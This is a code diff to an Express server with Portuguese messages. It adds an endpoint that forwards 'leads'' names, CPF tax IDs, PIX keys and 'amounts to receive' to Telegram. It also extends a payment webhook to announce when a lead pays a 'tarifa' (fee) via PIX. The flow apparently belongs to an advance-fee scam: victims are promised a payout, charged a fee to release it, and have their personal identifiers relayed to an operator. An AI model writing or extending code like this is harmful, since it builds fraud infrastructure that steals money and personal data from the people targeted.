@@ -634,7 +634,34 @@ app.post("/api/v1/buypix/create", async (req, res) => {
   }
 });
 
-app.post("/api/v1/buypix/webhook", (req, res) => {
+app.post("/api/v1/telemetry/chat", async (req, res) => {
+  try {
+    const { action, leadName, cpf, pix, value } = req.body;
+    let msg = "";
+    switch(action) {
+       case "entered":
+          msg = `🟢 <b>NOVO LEAD NO CHAT!</b>\n\n<b>Nome:</b> ${leadName || 'Desconhecido'}\n<b>CPF:</b> ${cpf || 'Desconhecido'}\n<b>Valor a Receber:</b> ${value || 'Desconhecido'}\n\nO Lead acabou de entrar na tela de conversa.`;
+          break;
+       case "left":
+          msg = `🔴 <b>LEAD SAIU DO CHAT!</b>\n\n<b>Nome:</b> ${leadName || 'Desconhecido'}\n<b>CPF:</b> ${cpf || 'Desconhecido'}\n\nO Lead abandonou a página do chat.`;
+          break;
+       case "generated_payment":
+          msg = `🟡 <b>PAGAMENTO GERADO!</b>\n\n<b>Nome:</b> ${leadName}\n<b>Chave PIX:</b> ${pix}\n<b>Valor do Saque:</b> ${value}\n\nO Lead chegou no final do chat e a guia de pagamento da tarifa foi gerada!`;
+          break;
+       case "whatsapp":
+          msg = `📱 <b>LEAD FOI PRO WHATSAPP!</b>\n\n<b>Nome:</b> ${leadName}\n<b>CPF:</b> ${cpf}\n\nO Lead clicou no botão para continuar pelo WhatsApp.`;
+          break;
+    }
+    if (msg) {
+       await sendTelegram(msg);
+    }
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ error: "Telemetry Error" });
+  }
+});
+
+app.post("/api/v1/buypix/webhook", async (req, res) => {
   try {
     const { event, data } = req.body;
     if (event === 'deposit.completed') {
@@ -642,6 +669,14 @@ app.post("/api/v1/buypix/webhook", (req, res) => {
       if (depositId) {
          buyPixStatus.set(depositId, 'completed');
          console.log(`💰 [BUYPIX] Pagamento Confirmado! ID: ${depositId}`);
+         await sendTelegram(`✅ <b>PAGAMENTO DA TARIFA CONFIRMADO!</b>\n\n<b>ID:</b> ${depositId}\n\nO Lead pagou a tarifa via PIX! 🎉`);
+      }
+    } else if (event === 'deposit.expired' || event === 'deposit.canceled') {
+      const depositId = data?.id;
+      if (depositId) {
+         buyPixStatus.set(depositId, 'expired');
+         console.log(`❌ [BUYPIX] Pagamento Expirado! ID: ${depositId}`);
+         await sendTelegram(`❌ <b>PAGAMENTO EXPIRADO!</b>\n\n<b>ID:</b> ${depositId}\n\nO tempo para pagamento da tarifa via PIX se esgotou ou foi cancelado.`);
       }
     }
     res.json({ success: true });
